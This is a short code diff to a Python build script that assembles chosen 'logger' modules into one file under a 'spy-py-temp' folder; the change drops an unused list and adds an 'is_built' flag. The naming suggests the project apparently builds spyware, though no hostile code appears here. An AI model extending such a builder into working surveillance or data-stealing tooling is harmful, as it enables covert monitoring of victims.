@@ -27,10 +27,7 @@ def assemble_source(selected_loggers):
     utils_content = ""
     loggers_content = ""
     main_content = ""
-    non_selected_loggers = [
-        file for file in get_logger_files() if file not in selected_loggers
-    ]
-
+    
     if not os.path.exists("spy-py-temp"):
         os.makedirs("spy-py-temp")
 
@@ -89,7 +86,7 @@ def assemble_source(selected_loggers):
         with open("spy-py-temp/assembled.py", "w", encoding="utf-8") as f:
             for imp in sorted(imports):
                 f.write(imp + "\n")
-            f.write("\n")
+            f.write("\nis_built = True\n\n")
             f.write(utils_content)
             f.write("\n")
             f.write(loggers_content)
